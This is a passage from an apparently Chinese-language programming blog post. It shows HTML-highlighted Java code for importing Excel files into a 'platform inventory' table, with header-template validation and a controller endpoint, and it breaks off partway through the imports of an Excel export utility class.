operator">=</span> <span class="token string">"建设详细地址"</span><span class="token punctuation">)</span>    <span class="token keyword">private</span> String address<span class="token punctuation">;</span>    <span class="token annotation punctuation">@ExcelColumn</span><span class="token punctuation">(</span>value <span class="token operator">=</span> <span class="token string">"简介"</span><span class="token punctuation">,</span> col <span class="token operator">=</span> <span class="token number">8</span><span class="token punctuation">)</span>    <span class="token annotation punctuation">@Excel</span><span class="token punctuation">(</span>name <span class="token operator">=</span> <span class="token string">"简介"</span><span class="token punctuation">,</span> sort <span class="token operator">=</span> <span class="token number">8</span><span class="token punctuation">)</span>    <span class="token annotation punctuation">@ApiModelProperty</span><span class="token punctuation">(</span>value <span class="token operator">=</span> <span class="token string">"简介"</span><span class="token punctuation">)</span>    <span class="token keyword">private</span> String description<span class="token punctuation">;</span>    <span class="token annotation punctuation">@ExcelColumn</span><span class="token punctuation">(</span>value <span class="token operator">=</span> <span class="token string">"清单类别"</span><span class="token punctuation">,</span> col <span class="token operator">=</span> <span class="token number">9</span><span class="token punctuation">)</span>    <span class="token annotation punctuation">@Excel</span><span class="token punctuation">(</span>name <span class="token operator">=</span> <span class="token string">"清单类别"</span><span class="token punctuation">,</span> sort <span class="token operator">=</span> <span class="token number">9</span><span class="token punctuation">)</span>    <span class="token annotation punctuation">@Column</span><span class="token punctuation">(</span>name <span class="token operator">=</span> <span class="token string">"inventory_type"</span><span class="token punctuation">)</span>    <span class="token annotation punctuation">@ApiModelProperty</span><span class="token punctuation">(</span>value <span class="token operator">=</span> <span class="token string">"清单类别"</span><span class="token punctuation">)</span>    <span class="token keyword">private</span> String inventoryType<span class="token punctuation">;</span>    <span class="token annotation punctuation">@ExcelColumn</span><span class="token punctuation">(</span>value <span class="token operator">=</span> <span class="token string">"备注"</span><span class="token punctuation">,</span> col <span class="token operator">=</span> <span class="token number">10</span><span class="token punctuation">)</span>    <span class="token annotation punctuation">@Excel</span><span class="token punctuation">(</span>name <span class="token operator">=</span> <span class="token string">"备注"</span><span class="token punctuation">,</span> sort <span class="token operator">=</span> <span class="token number">10</span><span class="token punctuation">)</span>    <span class="token annotation punctuation">@ApiModelProperty</span><span class="token punctuation">(</span>value <span class="token operator">=</span> <span class="token string">"备注"</span><span class="token punctuation">)</span>    <span class="token keyword">private</span> String remark<span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><h3 id="Service"><a href="#Service" class="headerlink" title="Service"></a>Service</h3><pre class=" language-java"><code class="language-java">    <span class="token keyword">public</span> String <span class="token function">insertData</span><span class="token punctuation">(</span>List<span class="token operator">&lt;</span>PlatformInventoryExcel<span class="token operator">></span> list<span class="token punctuation">,</span> MultipartFile file<span class="token punctuation">)</span> <span class="token keyword">throws</span> IOException <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>list <span class="token operator">==</span> null <span class="token operator">||</span> list<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">ServiceException</span><span class="token punctuation">(</span><span class="token string">"导入数据为空，请重试！"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        List<span class="token operator">&lt;</span>SysDictData<span class="token operator">></span> dictData <span class="token operator">=</span> dictTypeService<span class="token punctuation">.</span><span class="token function">selectDictDataByType</span><span class="token punctuation">(</span><span class="token string">"platform_inventory_type"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        Map<span class="token operator">&lt;</span>String<span class="token punctuation">,</span> String<span class="token operator">></span> map <span class="token operator">=</span> dictData<span class="token punctuation">.</span><span class="token function">stream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">collect</span><span class="token punctuation">(</span>Collectors<span class="token punctuation">.</span><span class="token function">toMap</span><span class="token punctuation">(</span>SysDictData<span class="token operator">:</span><span class="token operator">:</span>getDictLabel<span class="token punctuation">,</span> SysDictData<span class="token operator">:</span><span class="token operator">:</span>getDictValue<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> countError <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> countSuccess <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        StringBuilder errMsg <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">StringBuilder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        Sheet sheet<span class="token punctuation">;</span>        <span class="token keyword">try</span> <span class="token punctuation">{</span>            XSSFWorkbook wb <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">XSSFWorkbook</span><span class="token punctuation">(</span>file<span class="token punctuation">.</span><span class="token function">getInputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            sheet <span class="token operator">=</span> wb<span class="token punctuation">.</span><span class="token function">getSheetAt</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> ex<span class="token punctuation">)</span> <span class="token punctuation">{</span>            HSSFWorkbook wb <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HSSFWorkbook</span><span class="token punctuation">(</span>file<span class="token punctuation">.</span><span class="token function">getInputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            sheet <span class="token operator">=</span> wb<span class="token punctuation">.</span><span class="token function">getSheetAt</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token comment" spellcheck="true">//第一排</span>        Row row <span class="token operator">=</span> sheet<span class="token punctuation">.</span><span class="token function">getRow</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        Map<span class="token operator">&lt;</span>Integer<span class="token punctuation">,</span> String<span class="token operator">></span> fields <span class="token operator">=</span> ExcelUtils<span class="token punctuation">.</span><span class="token function">getFields</span><span class="token punctuation">(</span>PlatformInventoryExcel<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//字段校验方法</span>        ExportUtils<span class="token punctuation">.</span><span class="token function">checkCellHead</span><span class="token punctuation">(</span>row<span class="token punctuation">,</span> fields<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span>PlatformInventoryExcel inventoryExcel <span class="token operator">:</span> list<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">try</span> <span class="token punctuation">{</span>                PlatformInventory platformInventory <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">PlatformInventory</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                BeanUtils<span class="token punctuation">.</span><span class="token function">copyProperties</span><span class="token punctuation">(</span>inventoryExcel<span class="token punctuation">,</span> platformInventory<span class="token punctuation">)</span><span class="token punctuation">;</span>                platformInventory<span class="token punctuation">.</span><span class="token function">setInventoryType</span><span class="token punctuation">(</span>map<span class="token punctuation">.</span><span class="token function">getOrDefault</span><span class="token punctuation">(</span>inventoryExcel<span class="token punctuation">.</span><span class="token function">getInventoryType</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> inventoryExcel<span class="token punctuation">.</span><span class="token function">getInventoryType</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">insertSelective</span><span class="token punctuation">(</span>platformInventory<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">;</span>                countSuccess<span class="token operator">++</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>                log<span class="token punctuation">.</span><span class="token function">error</span><span class="token punctuation">(</span>e<span class="token punctuation">.</span><span class="token function">getMessage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                errMsg<span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span>e<span class="token punctuation">.</span><span class="token function">getMessage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                countError<span class="token operator">++</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>countError <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">return</span> <span class="token string">"成功导入"</span> <span class="token operator">+</span> countSuccess <span class="token operator">+</span> <span class="token string">"条数据,导入失败"</span> <span class="token operator">+</span> countError <span class="token operator">+</span> <span class="token string">"条数据!   "</span> <span class="token operator">+</span> errMsg<span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>countError <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">return</span> <span class="token string">"成功导入"</span> <span class="token operator">+</span> countSuccess <span class="token operator">+</span> <span class="token string">"条数据。"</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">return</span> <span class="token string">"成功导入"</span> <span class="token operator">+</span> countSuccess <span class="token operator">+</span> <span class="token string">"条数据。"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span></code></pre><h3 id="字段校验方法"><a href="#字段校验方法" class="headerlink" title="字段校验方法"></a>字段校验方法</h3><pre class=" language-java"><code class="language-java">  <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">checkCellHead</span><span class="token punctuation">(</span>Row row<span class="token punctuation">,</span> Map<span class="token operator">&lt;</span>Integer<span class="token punctuation">,</span> String<span class="token operator">></span> fields<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>row<span class="token punctuation">.</span><span class="token function">getLastCellNum</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> fields<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">ServiceException</span><span class="token punctuation">(</span><span class="token string">"导入模版有误!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> row<span class="token punctuation">.</span><span class="token function">getLastCellNum</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>row<span class="token punctuation">.</span><span class="token function">getCell</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span>fields<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">ServiceException</span><span class="token punctuation">(</span><span class="token string">"导入失败！请导入正确的模板！:第"</span> <span class="token operator">+</span> <span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"列【"</span> <span class="token operator">+</span> row<span class="token punctuation">.</span><span class="token function">getCell</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"】与模版不符合"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span></code></pre><h3 id="Controller-1"><a href="#Controller-1" class="headerlink" title="Controller"></a>Controller</h3><pre class=" language-java"><code class="language-java">  <span class="token annotation punctuation">@PostMapping</span><span class="token punctuation">(</span><span class="token string">"/import"</span><span class="token punctuation">)</span>    <span class="token annotation punctuation">@ApiOperation</span><span class="token punctuation">(</span><span class="token string">"导入"</span><span class="token punctuation">)</span>    <span class="token annotation punctuation">@Log</span><span class="token punctuation">(</span>            title <span class="token operator">=</span> <span class="token string">"平台清单-导入"</span><span class="token punctuation">,</span>            businessType <span class="token operator">=</span> BusinessType<span class="token punctuation">.</span>IMPORT    <span class="token punctuation">)</span>    <span class="token keyword">public</span> ResultData<span class="token operator">&lt;</span>String<span class="token operator">></span> <span class="token function">export</span><span class="token punctuation">(</span>MultipartFile file<span class="token punctuation">)</span> <span class="token keyword">throws</span> IOException <span class="token punctuation">{</span>        ResultData<span class="token operator">&lt;</span>String<span class="token operator">></span> resultData <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ResultData</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        ExcelUtil<span class="token operator">&lt;</span>PlatformInventoryExcel<span class="token operator">></span> util <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ExcelUtil</span><span class="token operator">&lt;</span><span class="token operator">></span><span class="token punctuation">(</span>PlatformInventoryExcel<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        List<span class="token operator">&lt;</span>PlatformInventoryExcel<span class="token operator">></span> list <span class="token operator">=</span> null<span class="token punctuation">;</span>        <span class="token keyword">try</span> <span class="token punctuation">{</span>            <span class="token keyword">try</span> <span class="token punctuation">{</span>                list <span class="token operator">=</span> util<span class="token punctuation">.</span><span class="token function">importExcel</span><span class="token punctuation">(</span>file<span class="token punctuation">.</span><span class="token function">getInputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">BaseException</span><span class="token punctuation">(</span><span class="token string">"导入失败！请导入正确的模板！"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            String msg <span class="token operator">=</span> biz<span class="token punctuation">.</span><span class="token function">insertData</span><span class="token punctuation">(</span>list<span class="token punctuation">,</span> file<span class="token punctuation">)</span><span class="token punctuation">;</span>            resultData<span class="token punctuation">.</span><span class="token function">setData</span><span class="token punctuation">(</span>msg<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>            resultData<span class="token punctuation">.</span><span class="token function">setCode</span><span class="token punctuation">(</span>CommonMessage<span class="token punctuation">.</span>ERROR<span class="token punctuation">)</span><span class="token punctuation">;</span>            resultData<span class="token punctuation">.</span><span class="token function">setMsg</span><span class="token punctuation">(</span>e<span class="token punctuation">.</span><span class="token function">getMessage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">return</span> resultData<span class="token punctuation">;</span>    <span class="token punctuation">}</span></code></pre><h2 id="获取字段属性"><a href="#获取字段属性" class="headerlink" title="获取字段属性"></a>获取字段属性</h2><p>该代码实现的功能是获取一个类中标注了@Excel注解的属性，并将其排序和名称存储在一个Map中。</p><pre class=" language-java"><code class="language-java">   <span class="token keyword">public</span> <span class="token keyword">static</span> Map<span class="token operator">&lt;</span>Integer<span class="token punctuation">,</span> String<span class="token operator">></span> <span class="token function">getFields</span><span class="token punctuation">(</span>Class <span class="token class-name">clazz</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        Map<span class="token operator">&lt;</span>Integer<span class="token punctuation">,</span> String<span class="token operator">></span> map <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token operator">&lt;</span><span class="token operator">></span><span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        Field<span class="token punctuation">[</span><span class="token punctuation">]</span> fields <span class="token operator">=</span> clazz<span class="token punctuation">.</span><span class="token function">getDeclaredFields</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span>Field field <span class="token operator">:</span> fields<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token comment" spellcheck="true">//判断属性是否标注了@Excel注解</span>            <span class="token keyword">boolean</span> fieldHasAnno <span class="token operator">=</span> field<span class="token punctuation">.</span><span class="token function">isAnnotationPresent</span><span class="token punctuation">(</span>Excel<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>fieldHasAnno<span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token comment" spellcheck="true">//获取@Excel注解</span>                Excel excel <span class="token operator">=</span> field<span class="token punctuation">.</span><span class="token function">getAnnotation</span><span class="token punctuation">(</span>Excel<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                map<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>excel<span class="token punctuation">.</span><span class="token function">sort</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">,</span> excel<span class="token punctuation">.</span><span class="token function">name</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token keyword">return</span> map<span class="token punctuation">;</span>    <span class="token punctuation">}</span></code></pre><h2 id="模板校验"><a href="#模板校验" class="headerlink" title="模板校验"></a>模板校验</h2><pre class=" language-java"><code class="language-java">  <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">checkCellHead</span><span class="token punctuation">(</span>Row row<span class="token punctuation">,</span> Map<span class="token operator">&lt;</span>Integer<span class="token punctuation">,</span> String<span class="token operator">></span> fields<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>row<span class="token punctuation">.</span><span class="token function">getLastCellNum</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> fields<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">ServiceException</span><span class="token punctuation">(</span><span class="token string">"导入模版有误!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> row<span class="token punctuation">.</span><span class="token function">getLastCellNum</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>row<span class="token punctuation">.</span><span class="token function">getCell</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span>fields<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">ServiceException</span><span class="token punctuation">(</span><span class="token string">"导入失败！请导入正确的模板！:第"</span> <span class="token operator">+</span> <span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"列【"</span> <span class="token operator">+</span> row<span class="token punctuation">.</span><span class="token function">getCell</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"】与模版不符合"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span></code></pre><h1 id="导出"><a href="#导出" class="headerlink" title="导出"></a>导出</h1><h2 id="Excel工具类（包含自定义字段下拉框且不限个数）"><a href="#Excel工具类（包含自定义字段下拉框且不限个数）" class="headerlink" title="Excel工具类（包含自定义字段下拉框且不限个数）"></a>Excel工具类（包含自定义字段下拉框且不限个数）</h2><pre class=" language-java"><code class="language-java"><span class="token keyword">package</span> com<span class="token punctuation">.</span>psds<span class="token punctuation">.</span>credit<span class="token punctuation">.</span>util<span class="token punctuation">;</span><span class="token keyword">import</span> cn<span class="token punctuation">.</span>hutool<span class="token punctuation">.</span>core<span class="token punctuation">.</span>date<span class="token punctuation">.</span>DateUtil<span class="token punctuation">;</span><span class="token keyword">import</span> com<span class="token punctuation">.</span>psds<span class="token punctuation">.</span>credit<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span>ExcelColumn<span class="token punctuation">;</span><span class="token keyword">import</span> com<span class="token punctuation">.</span>psds<span class="token punctuation">.</span>credit<span class="token punctuation">.</span>common<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span>Excel<span class="token punctuation">;</span><span class="token keyword">import</span> com<span class="token punctuation">.</span>psds<span class="token punctuation">.</span>credit<span class="token punctuation">.</span>controller<span class="token punctuation">.</span>vo<span class="token punctuation">.</span>resp<span class="token punctuation">.</span>PlatformInventoryExcel<span class="token punctuation">;</span><span class="token keyword">import</span> com<span class="token punctuation">.</span>psds<span class="token punctuation">.</span>credit<span class="token punctuation">.</span>controller<span class="token punctuation">.</span>vo<span class="token punctuation">.</span>resp<span class="token punctuation">.</span>ProjectListExcel<span class="token punctuation">;</span><span class="token keyword">import</span> com<span class="token punctuation">.</span>psds<span class="token punctuation">.</span>credit<span class="token punctuation">.</span>entity<span class="token punctuation">.</span>excel<span class="token punctuation">.</span>EnterpriseExcel<span class="token punctuation">;</span><span class="token keyword">import</span> lombok<span class="token punctuation">.</span>extern<span class="token punctuation">.</span>slf4j<span class="token punctuation">.</span>Slf4j<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>CollectionUtils<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>poi<span class="token punctuation">.</span>hssf<span class="token punctuation">.</span>usermodel<span class="token punctuation">.</span>*<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>poi<span class="token punctuation">.</span>hssf<span class="token punctuation">.</span>util<span class="token punctuation">.</span>HSSFColor<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>poi<span class="token punctuation">.</span>ss<span class="token punctuation">.</span>usermodel<span class="token punctuation">.</span>BorderStyle<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>poi<span class="token punctuation">.</span>ss<span class="token punctuation">.</span>usermodel<span class="token punctuation">.</span>Cell<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>poi<span class="token punctuation">.</span>ss<span class="token punctuation">.</span>usermodel<span class="token punctuation">.</span>CellStyle<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>poi<span class="token punctuation">.</span>ss<span class="token punctuation">.</span>usermodel<span class="token punctuation">.</span>FillPatternType<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>poi<span class="token punctuation">.</span>ss<span class="token punctuation">.</span>usermodel<span class="token punctuation">.</span>Font<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>poi<span class="token punctuation">.</span>ss<span class="token punctuation">.</span>usermodel<span class="token punctuation">.</span>HorizontalAlignment<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>poi<span class="token punctuation">.</span>ss<span class="token punctuation">.</span>usermodel<span class="token punctuation">.</span>IndexedColors<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>poi<span class="token punctuation">.</span>ss<span class="token punctuation">.</span>usermodel<span class="token punctuation">.</span>Name<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>poi<span class="token punctuation">.</span>ss<span class="token punctuation">.</span>usermodel<span class="token punctuation">.</span>Row<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>poi<span class="token punctuation">.</span>ss<span class="token punctuation">.</span>usermodel<span class="token punctuation">.</span>Sheet<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>poi<span class="token punctuation">.</span>ss<span class="token punctuation">.</span>usermodel<span class="token punctuation">.</span>VerticalAlignment<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>poi<span class="token punctuation">.</span>ss<span class="token punctuation">.</span>usermodel<span class="token punctuation">.</span>Workbook<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>poi<span class="token punctuation">.</span>ss<span class="token punctuation">.</span>util<span class="token punctuation">.</span>CellRangeAddressList<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>poi<span class="token punctuation">.</span>xssf<span class="token punctuation">.</span>usermodel<span class="token punctuation">.</span>XSSFCell<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>poi<span class="token punctuation">.</span>xssf<span class="token punctuation">.</span>usermodel<span class="token punctuation">.</span>XSSFCellStyle<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>poi<span class="token punctuation">.</span>xssf<span class="token punctuation">.</span>usermodel<span class="token punctuation">.</span>XSSFDataValidation<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>poi<span class="token punctuation">.</span>xssf<span class="token punctuation">.</span>usermodel<span class="token punctuation">.</span>XSSFDataValidationConstraint<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>poi<span class="token punctuation">.</span>xssf<span class="token punctuation">.</span>usermodel<span class="token punctuation">.</span>XSSFDataValidationHelper<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>poi<span class="token punctuation">.</span>xssf<span class="token punctuation">.</span>usermodel<span class="token punctuation">.</span>XSSFFont<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>poi<span class="token punctuation">.</span>xssf<span class="token punctuation">.</span>usermodel<span class="token punctuation">.</span>XSSFName<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>poi<span class="token punctuation">.</span>xssf<span class="token punctuation">.</span>usermodel<span class="token punctuation">.</span>XSSFRow<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>poi<span class="token punctuation">.</span>xssf<span class="token punctuation">.</span>usermodel<span class="token punctuation">.</span>XSSFSheet<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>poi<span class="token punctuation">.</span>xssf<span class="token punctuation">.</span>usermodel<span class="token punctuation">.</span>XSSFWorkbook<span class="token punctuation">;</span><span class="token keyword">import</span> javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span>http<span class="token punctuation">.</span>HttpServletResponse<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>File<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>FileOutputStream<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>IOException<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>io<span class="token 